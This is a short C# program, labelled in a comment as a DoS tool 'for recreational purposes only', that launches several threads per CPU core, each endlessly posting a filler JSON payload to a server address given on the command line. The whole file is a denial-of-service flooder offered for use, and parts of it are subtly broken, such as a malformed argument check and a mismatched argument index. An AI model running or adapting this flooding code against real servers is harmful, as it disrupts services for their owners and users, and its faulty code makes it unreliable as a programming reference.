using System;
using System.Threading;
using System.Net.Http;
using System.Text.Json;
// DoS | For recreational purposes only
delegate void function(params object[] args);
class Program {
  static int THREADS;
  public static void stress(string server, string package) {
    
    var thread = new Thread(() => {
      while (true) {
        Thread.Sleep(1);
        using(var client = new HttpClient()) {
          client.PostAsync(server, new StringContent(package));
        }
      }
    });
    thread.Start();
  }
  public static void Main(string[] args) {
    // Getting Cores
    if (args.GetLength() < 2)
    {
      Console.WriteLine("This program needs 1 argument");
    }
    int cores = 0;
    foreach (var item in new System.Management.ManagementObjectSearcher("Select * from Win32_Processor").Get())
    {
        cores += int.Parse(item["NumberOfCores"].ToString());
    }
    THREADS = Convert.ToInt16(cores * 1.25 + 2);
    
    var package = new object[100];
    for (int i = 0; i < 100; ++i)
    {
      package[i] = new string('A', 100);
    }
    var packload = JsonSerializer.Serialize(package);

    for (int i = 0; i < THREADS; i++) 
    {
      stress(args[1], packload);
    }
    
  }
}
